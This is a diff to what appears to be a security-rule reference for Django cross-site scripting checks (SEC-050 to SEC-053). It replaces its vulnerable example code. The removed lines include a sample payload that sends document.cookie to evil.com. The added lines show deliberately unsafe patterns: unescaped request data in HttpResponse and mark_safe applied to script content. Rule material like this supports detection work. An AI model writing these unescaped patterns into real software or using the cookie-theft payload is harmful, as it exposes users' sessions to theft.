@@ -41,21 +41,37 @@ phishing forms, or redirect users to look-alike sites to steal additional creden
 
 VULNERABLE EXAMPLE:
 ```python
-from django.http import HttpResponse
-from django.utils.safestring import mark_safe
+from django.http import HttpResponse, HttpResponseBadRequest
+from django.utils.safestring import mark_safe, SafeString
+from django.utils.html import html_safe
 
-def greet_user(request):
-    # VULNERABLE: User input directly in HttpResponse without escaping
+
+# SEC-050: HttpResponse with request data
+def vulnerable_httpresponse(request):
     name = request.GET.get('name')
-    return HttpResponse("<h1>Hello, " + name + "!</h1>")
-    # Attack: ?name=<script>document.location='http://evil.com/?c='+document.cookie</script>
+    return HttpResponse(f"Hello {name}")
 
-def render_comment(request):
-    # VULNERABLE: User input passed to mark_safe bypasses auto-escaping
-    comment = request.POST.get('comment')
-    safe_comment = mark_safe(comment)
-    # This HTML will NOT be escaped in templates
-    return render(request, 'comment.html', {'comment': safe_comment})
+
+def vulnerable_httpresponse_bad(request):
+    msg = request.GET.get('error')
+    return HttpResponseBadRequest(msg)
+
+
+# SEC-051: mark_safe (audit)
+def risky_mark_safe():
+    content = "<script>alert(1)</script>"
+    return mark_safe(content)
+
+
+# SEC-052: html_safe (audit)
+@html_safe
+class MyWidget:
+    def __str__(self):
+        return "<div>widget</div>"
+
+
+# SEC-053: SafeString subclass (audit)
+custom = SafeString("<b>bold</b>")
 ```
 
 SECURE EXAMPLE:
